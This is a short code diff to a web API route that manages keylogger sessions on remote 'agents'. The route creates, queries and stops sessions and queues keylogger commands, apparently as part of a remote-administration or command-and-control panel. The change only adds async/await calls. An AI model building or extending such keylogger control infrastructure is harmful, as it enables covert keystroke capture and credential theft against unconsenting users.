@@ -89,13 +89,13 @@ function parseConfig(input: Record<string, unknown> | undefined | null): Keylogg
 	return config;
 }
 
-export const GET: RequestHandler = ({ params, locals }) => {
+export const GET: RequestHandler = async ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
 	requireViewer(locals.user);
-	return json(keyloggerManager.getState(id));
+	return json(await keyloggerManager.getState(id));
 };
 
 export const POST: RequestHandler = async ({ params, request, locals }) => {
@@ -114,7 +114,7 @@ export const POST: RequestHandler = async ({ params, request, locals }) => {
 	}
 
 	const configInput = (body.config as Record<string, unknown> | undefined) ?? body;
-	const session = keyloggerManager.createSession(
+	const session = await keyloggerManager.createSession(
 		id,
 		parseConfig(configInput),
 		typeof body.sessionId === 'string' ? body.sessionId : undefined
@@ -130,7 +130,7 @@ export const POST: RequestHandler = async ({ params, request, locals }) => {
 		throw error(500, 'Failed to queue keylogger command');
 	}
 
-	return json(keyloggerManager.getState(id), { status: 201 });
+	return json(await keyloggerManager.getState(id), { status: 201 });
 };
 
 export const DELETE: RequestHandler = async ({ params, request, locals }) => {
@@ -148,7 +148,7 @@ export const DELETE: RequestHandler = async ({ params, request, locals }) => {
 		body = {};
 	}
 
-	const stopped = keyloggerManager.stopSession(
+	const stopped = await keyloggerManager.stopSession(
 		id,
 		typeof body.sessionId === 'string' ? body.sessionId : undefined
 	);
@@ -165,5 +165,5 @@ export const DELETE: RequestHandler = async ({ params, request, locals }) => {
 		}
 	}
 
-	return json(keyloggerManager.getState(id));
+	return json(await keyloggerManager.getState(id));
 };
